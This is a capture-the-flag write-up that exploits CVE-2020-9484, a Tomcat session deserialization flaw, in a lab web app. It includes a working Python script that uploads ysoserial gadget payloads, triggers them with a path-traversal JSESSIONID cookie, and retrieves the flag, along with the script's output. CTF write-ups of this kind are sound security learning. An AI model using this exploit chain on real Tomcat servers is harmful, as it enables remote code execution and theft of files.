# HV20.21 Threatened Cat

For this challenge, we get access to a web application that allows us to upload files. The web application will scan the file (basic content detection, probably implemented using the `file` command) and tell us whether the file is considered dangerous. Our goal is to disclose the flag, which is stored on the server at `/usr/bin/catnip.txt`.

After some basic information gathering, I found out that the application was built in Java (we can see it from the error message when uploading a file that is larger than the allowed limit). From the output of the application, we can see that our files are stored at `/usr/local/uploads/` on the server. My first guess was to upload a JSP file and gain remote code execution, but of course it did not work (honestly this would have been too easy).

As the challenge description already provided the correct path for the flag file, my first assumption was that the application is most likely vulnerable to a local file inclusion attack / path traversal attack. I tried various payloads to mess with both, the upload and the download functionality, but nothing worked out as expected. Moreover, I did some testing for other commonly known attacks like command injection and XXE (XML External Entity) but still was not able to find anything that would be exploitable.

Maybe there is a special reason why this challenge was built in Java. I searched for some more Java-specific attacks and realized that this might also be a deserialization attack. I tried my luck and generated a malicious serialized Java object created using the [ysoserial](https://github.com/frohoff/ysoserial) tool. Out of the sudden, the output of the application changed: `[W]: Exactly this kind of things is threatening this cat`.

This confirms that I was on the right track, so I tried to create a payload that copies the file with our flag to the publicly accessible folder (`/usr/local/uploads/`). Unfortunately, this did not work so I had to do some research on how this type of attack could work in our scenario. I figured out that maybe my payload was never triggered because nobody yet tried to deserialize the file I provided. After some more googling, I found an interesting [CVE-2020-9484](https://nvd.nist.gov/vuln/detail/CVE-2020-9484) which could help us here.

This CVE describes a [Tomcat](http://tomcat.apache.org/) vulnerability (now the cat focus of the whole challenge finally makes sense). Vulnerable versions of Tomcat would allow an attacker to specify a malicious value for `JSESSIONID` (a filename). The server would then append the `.session` extension to the provided value and try to load (deserialize) the file.

This means that after uploading our exploit payload, we need to send another request with a crafted `JSESSIONID` cookie that points to our uploaded file. Afterwards, Tomcat will deserialize our payload and trigger the exploit. As I was not exactly sure what `ysoserial` payload is the correct one, I created a small [python program](./uploader.py) that uploads each of the payloads, automatically triggers the exploit and then checks if the `catnip.txt` was correctly copied over to the public folder:

```python
#!/usr/bin/env python3

import requests
from os import system
from time import sleep

url = 'https://c1084068-db92-46fc-b937-92858be641c9.idocker.vuln.land/cat/'

def upload_file(filename):
    with open(filename, 'rb') as input_file:
        data = input_file.read()

    files = {'file': (filename, data)}

    response = requests.post(url, files=files)
    if not "harmless" in response.text:
        print(f"Valid payload: {filename}")
    else:
        print("Payload not valid")

payloads = ["BeanShell1", "C3P0", "Clojure", "CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2",
    "CommonsCollections3", "CommonsCollections4", "CommonsCollections5", "CommonsCollections6", "FileUpload1",
    "Groovy1", "Hibernate1", "Hibernate2", "JBossInterceptors1", "JRMPClient", "JRMPListener", "JSON1", "JavassistWeld1",
    "Jdk7u21", "Jython1", "MozillaRhino1", "Myfaces1", "Myfaces2", "ROME", "Spring1", "Spring2", "URLDNS", "Wicket1"]

for payload in payloads:
    file = f"payload_{payload}.session"
    system(f"java -jar ysoserial-master-6eca5bc740-1.jar {payload} 'cp /usr/bin/catnip.txt /usr/local/uploads/' > {file} 2>/dev/null")

    # 1. Upload the payload
    upload_file(file)

    # 2. Trigger the exploit
    fake_session_id = f'JSESSIONID=../../../../../usr/local/uploads/payload_{payload}'
    headers = { 'Cookie': fake_session_id }
    print(url + "index.jsp")
    response = requests.get(url + "index.jsp", headers=headers)

    # 3. Check if it worked
    response = requests.get(url + "files/catnip.txt")
    if response.status_code != 404:
        print(response.text)
        exit(0)

    system(f"rm {file}")
    print("------------------------------------------------")
```

Running this script gave me access to the flag. In my case, the first working `ysoserial` payload was `CommonsCollections2`:

```bash
➜  21 git:(main) ✗ ./uploader.py
Valid payload: payload_BeanShell1.session
https://c1084068-db92-46fc-b937-92858be641c9.idocker.vuln.land/cat/index.jsp
------------------------------------------------
Valid payload: payload_C3P0.session
https://c1084068-db92-46fc-b937-92858be641c9.idocker.vuln.land/cat/index.jsp
------------------------------------------------
Valid payload: payload_Clojure.session
https://c1084068-db92-46fc-b937-92858be641c9.idocker.vuln.land/cat/index.jsp
------------------------------------------------
Valid payload: payload_CommonsBeanutils1.session
https://c1084068-db92-46fc-b937-92858be641c9.idocker.vuln.land/cat/index.jsp
------------------------------------------------
Valid payload: payload_CommonsCollections1.session
https://c1084068-db92-46fc-b937-92858be641c9.idocker.vuln.land/cat/index.jsp
------------------------------------------------
Valid payload: payload_CommonsCollections2.session
https://c1084068-db92-46fc-b937-92858be641c9.idocker.vuln.land/cat/index.jsp
HV20{!D3s3ri4liz4t10n_rulz!}
```

**Flag:** HV20{!D3s3ri4liz4t10n_rulz!}
